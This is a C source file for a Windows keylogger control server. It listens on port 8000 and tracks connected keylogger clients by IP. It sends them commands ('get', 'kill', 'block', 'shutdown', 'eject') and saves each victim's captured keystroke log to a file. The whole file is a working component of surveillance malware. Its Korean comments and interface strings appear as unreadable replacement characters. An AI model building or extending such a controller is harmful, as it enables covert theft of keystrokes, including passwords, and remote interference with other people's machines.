#pragma warning(disable:4996)

#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <tchar.h>
#include "resource.h"

#define BUF_SIZE 256
#define MYPORT 8000
#define FILE_BUF 1024
BOOL isSend = FALSE;
HWND hWndMain;
WSADATA wsaData;
HANDLE pThread;

TCHAR Listbuf[BUF_SIZE];
int numOfClntSock = 0;//���ϱ���ü�� �̺�Ʈ ����ü ����
int numOfIP = 0;//client����ü ����

SOCKET hSockArr[WSA_MAXIMUM_WAIT_EVENTS];//���ϱ���ü
WSAEVENT hEventArr[WSA_MAXIMUM_WAIT_EVENTS];//�̺�Ʈ����ü

struct Client{

	SOCKET Socket;
	TCHAR Addr[20];
	int S_Windex;//���� ����ü�� �ε���

}Client[WSA_MAXIMUM_WAIT_EVENTS];//Ŭ���̾�Ʈ ����ü

unsigned int WINAPI ConnectKeyLog(void* data);//Ű�ΰ� �����Լ�
void CloseConnect();//���������Լ�
void SendCommand(char* com,int idx);//������� �Լ�
void Compress(int idx, int total);//����,�̺�Ʈ ����ü����
void CompressAddr(int idx, int total);//Ŭ���̾�Ʈ ����ü ����

BOOL CALLBACK MainDlgProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
	, LPSTR lpszCmdParam, int nCmdShow)
{
	
	DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), HWND_DESKTOP, MainDlgProc);//���̾˷α� ����

	return 0;
}


BOOL CALLBACK MainDlgProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
{
	DWORD index = 0;
	TCHAR buf[BUF_SIZE] = { 0, };
	
	switch (iMessage) {

	case WM_INITDIALOG :
	
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		hWndMain = hWnd;
		
		SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)TEXT("������ ��� ������...."));
		

		pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectKeyLog,0, 0, 0);//��ſ� ������ ����
		return TRUE;


	case WM_COMMAND ://���� ��ư������ ��� ó��

		switch (LOWORD(wParam)) {

		case IDC_RECV :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT,index,(LPARAM)buf);

			if (isSend == TRUE) {
				MessageBox(hWnd, TEXT("�̹� �������������Դϴ�"), TEXT("�˸�"), MB_OK);
			}
			else if(_tcslen(buf) <= 0)//����
			{
				MessageBox(hWnd, TEXT("�����Ǹ� �����ϼ���"), TEXT("�˸�"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s �����Ƿκ��� �����͸� �������Դϴ�.."),buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("get",index);
				memset(buf, 0, BUF_SIZE);
			}
			return TRUE;

		case IDC_EJECT :
			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("�����Ǹ� �����ϼ���"), TEXT("�˸�"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s �������� �õ���� ���� �Ͽ����ϴ�."), buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("eject", index);
			}
			return TRUE;


		case IDC_BLOCK :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("�����Ǹ� �����ϼ���"), TEXT("�˸�"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s �����ǿ��� ��ŷ�� �Ͽ����ϴ�."), buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("block", index);
			}
			return TRUE;

		case IDC_UNBLOCK :
			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("�����Ǹ� �����ϼ���"), TEXT("�˸�"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s �����ǿ��� ���ŷ�� �Ͽ����ϴ�."), buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("unblock", index);
			}
			return TRUE;
			
		case IDC_SHUTDOWN :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("�����Ǹ� �����ϼ���"), TEXT("�˸�"), MB_OK);
				return FALSE;
			}
			else {

				
				SendCommand("shutdown", index);
				
			}
			return TRUE;

		case IDC_EXIT :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);

			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("�����Ǹ� �����ϼ���"), TEXT("�˸�"), MB_OK);
				return FALSE;
			}

			else {
				
				
				SendCommand("kill",index);
				
			}
			return TRUE;

		
		case IDCANCEL :

			CloseConnect();//����������
			EndDialog(hWnd, IDCANCEL);//����
			return TRUE;

		}
		return FALSE;
	}

	return FALSE;
}

unsigned int WINAPI ConnectKeyLog(void* data)//Ű�ΰ� ���� �Լ�
{
	SOCKET hServSock, hClntSock;
	SOCKADDR_IN servAdr, clntAdr;
	WSAEVENT newEvent = NULL;
	WSANETWORKEVENTS netEvents;

	int i;
	DWORD C_index = 0;
	int posInfo, startIdx;
	int clntAdrLen;
	TCHAR FileName[BUF_SIZE];

	HANDLE hFile;
	int recvresult;
	char fbuf[FILE_BUF];
	TCHAR mBuf[BUF_SIZE];
	DWORD WriteResult;
	char* IP = NULL;

	hServSock = socket(PF_INET, SOCK_STREAM, 0);
	if(hServSock == INVALID_SOCKET)
		MessageBox(hWndMain, TEXT("socket����"), TEXT("����"), MB_OK);

	memset(&servAdr, 0, sizeof(servAdr));
	servAdr.sin_family = AF_INET;
	servAdr.sin_addr.s_addr = htonl(INADDR_ANY);
	servAdr.sin_port = htons(MYPORT);

	if (bind(hServSock, (SOCKADDR*)&servAdr, sizeof(servAdr)) == SOCKET_ERROR)
		MessageBox(hWndMain, TEXT("bind����"), TEXT("����"), MB_OK);

	if (listen(hServSock, 5) == SOCKET_ERROR)
		MessageBox(hWndMain, TEXT("listen����"), TEXT("����"), MB_OK);

	newEvent = WSACreateEvent();

	if (WSAEventSelect(hServSock, newEvent, FD_ACCEPT) == SOCKET_ERROR)
		MessageBox(hWndMain, TEXT("fdaccept����"), TEXT("����"), MB_OK);

	hSockArr[numOfClntSock] = hServSock;
	hEventArr[numOfClntSock] = newEvent;
	numOfClntSock++;
	while (1)
	{
		posInfo = WSAWaitForMultipleEvents(numOfClntSock, hEventArr, FALSE, WSA_INFINITE, FALSE);
		startIdx = posInfo - WSA_WAIT_EVENT_0;

		for (i = startIdx;i<numOfClntSock;i++)
		{
			int sigEventIdx = WSAWaitForMultipleEvents(1, &hEventArr[i], TRUE, 0, FALSE);
			if ((sigEventIdx == WSA_WAIT_FAILED || sigEventIdx == WSA_WAIT_TIMEOUT))
			{
				continue;
			}
			else {
				sigEventIdx = i;
				WSAEnumNetworkEvents(hSockArr[sigEventIdx], hEventArr[sigEventIdx], &netEvents);
				if (netEvents.lNetworkEvents & FD_ACCEPT)//Ű�ΰ� ���ӽ�
				{
					if (netEvents.iErrorCode[FD_ACCEPT_BIT] != 0)
					{
						break;
					}
					clntAdrLen = sizeof(clntAdr);
					hClntSock = accept(hSockArr[sigEventIdx], (SOCKADDR*)&clntAdr, &clntAdrLen);
					newEvent = WSACreateEvent();
					WSAEventSelect(hClntSock, newEvent, FD_READ | FD_CLOSE);

					hEventArr[numOfClntSock] = newEvent;
					hSockArr[numOfClntSock] = hClntSock;
					Client[numOfIP].Socket = hClntSock;
					Client[numOfIP].S_Windex = numOfClntSock;

					IP = inet_ntoa(clntAdr.sin_addr);
					MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, IP, strlen(IP), Client[numOfClntSock].Addr,strlen(IP));
					Client[numOfClntSock].Addr[strlen(IP)] = '\0';
					SendDlgItemMessage(hWndMain, IDC_LIST1, LB_ADDSTRING, 0,(LPARAM)(Client[numOfClntSock].Addr));
					memset(mBuf, 0, BUF_SIZE);
					wsprintf(mBuf, TEXT("%s �����ǰ� �����߽��ϴ�."),Client[numOfClntSock].Addr);
					SendDlgItemMessage(hWndMain, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)mBuf);
					numOfClntSock++;
					numOfIP++;


					
				}
				if (netEvents.lNetworkEvents & FD_READ)
				{
					if (netEvents.iErrorCode[FD_READ_BIT] != 0)
					{
						break;
					}
					//Ű�ΰŷκ��� ���Ϲޱ�
					wsprintf(FileName, TEXT("%s.txt"), Client[sigEventIdx].Addr);
					hFile = CreateFile(FileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					while (1)
					{
						recvresult = recv(hSockArr[sigEventIdx], fbuf,FILE_BUF, 0);
						if (recvresult <= 0) {
							WriteFile(hFile, fbuf, recvresult, &WriteResult, NULL);
							break;
						}

						WriteFile(hFile, fbuf, recvresult, &WriteResult, NULL);
					}
					Sleep(1000);
					SendDlgItemMessage(hWndMain, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)TEXT("���� ������ �Ϸ��Ͽ����ϴ�!"));
					CloseHandle(hFile);
					isSend = FALSE;

				}

				if (netEvents.lNetworkEvents & FD_CLOSE)//Ű�ΰ� �����
				{
					
					if (netEvents.iErrorCode[FD_CLOSE_BIT] != 0)
					{
						break;
					}
					
					
					for (i = 0;i < numOfIP;i++) {
						if (sigEventIdx == Client[i].S_Windex) {
							C_index = i;
							break;
	
						}
					}

					SendDlgItemMessage(hWndMain, IDC_LIST1, LB_DELETESTRING, C_index, 0);
					memset(mBuf, 0, BUF_SIZE);
					wsprintf(mBuf, TEXT("%s �����ǰ� ������ �����Ͽ����ϴ�"), Client[C_index].Addr);
					SendDlgItemMessage(hWndMain, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)mBuf);
					WSACloseEvent(hEventArr[sigEventIdx]);
					closesocket(hSockArr[sigEventIdx]);
					Compress(sigEventIdx, numOfClntSock);
					CompressAddr(C_index,numOfIP);
					numOfClntSock--;
					numOfIP--;

				}
			}
		}

	}
	
	return TRUE;
}


void CloseConnect()//��������
{
	DWORD dwResult;

	GetExitCodeThread(pThread, &dwResult);

	for (int i = 0;i < numOfClntSock;i++)
	{
		closesocket(hSockArr[i]);
		WSACloseEvent(hEventArr[i]);

	}
	CloseHandle(pThread);
	WSACleanup();

}

void SendCommand(char* com,int idx)//��������Լ�
{

		if (strncmp(com, "get", 3) == 0)
		{
			isSend = TRUE;
			send(Client[idx].Socket, "get", 3, 0);
		}
		else if (strncmp(com, "kill", 4) == 0)
		{
			send(Client[idx].Socket, "kill", 4, 0);
		}
		else if (strncmp(com, "unblock", 7) == 0)
		{
			send(Client[idx].Socket, "unblock", 7, 0);
		}
		else if (strncmp(com, "block", 5) == 0) {
			send(Client[idx].Socket, "block", 5, 0);
		}
		else if (strncmp(com, "shutdown", 8) == 0) {
			send(Client[idx].Socket, "shutdown", 8, 0);
		}
		else if (strncmp(com, "eject", 5) == 0) {
			send(Client[idx].Socket, "eject", 5, 0);
		}
		else if (strncmp(com, "uneject", 7) == 0) {
			send(Client[idx].Socket, "uneject", 7, 0);
		}

}


void Compress(int idx, int total)//���ϱ���ü�� �̺�Ʈ ����ü ����
{
	int i;
	for (i = idx;i < total;i++)
	{
		hSockArr[i] = hSockArr[i + 1];
		hEventArr[i] = hEventArr[i + 1];
	}

}

void CompressAddr(int idx, int total)//Ŭ���̾�Ʈ����ü ����
{
	int i;
	for (i = idx; i < total;i++)
		Client[i] = Client[i + 1];
}

//ó�� ����� ������ �Ƚ����� ����
